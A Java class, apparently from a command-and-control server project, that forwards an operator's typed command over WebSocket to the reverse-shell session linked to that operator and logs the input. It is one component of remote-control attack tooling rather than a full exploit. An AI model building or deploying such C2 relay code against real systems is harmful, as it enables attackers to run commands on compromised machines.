package com.mtattab.c2cServer.service.commands.connected;

import com.mtattab.c2cServer.model.ManagerCommunicationModel;
import com.mtattab.c2cServer.service.Command;
import com.mtattab.c2cServer.util.ConnectionManager;
import com.mtattab.c2cServer.util.DataManipulationUtil;
import com.mtattab.c2cServer.util.SocketUtil;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.util.List;
@Slf4j
public class DefualtConnectedCommand implements Command {
    @Override
    public void execute(List<String> args, WebSocketSession currentSocket) {
        String mangerMessage = DataManipulationUtil.joinListWithDelimiter(args," ");

        WebSocketSession targetReverseShellSocket= ConnectionManager.connectedManagerToReverseSessions.get(currentSocket);

        SocketUtil.sendMessage(targetReverseShellSocket, new TextMessage(
                DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                        .msg(mangerMessage)
                        .masterSessionId(currentSocket.getId())
                        .build()
                )));
        log.debug("Manager input is: {}",mangerMessage);
    }
}
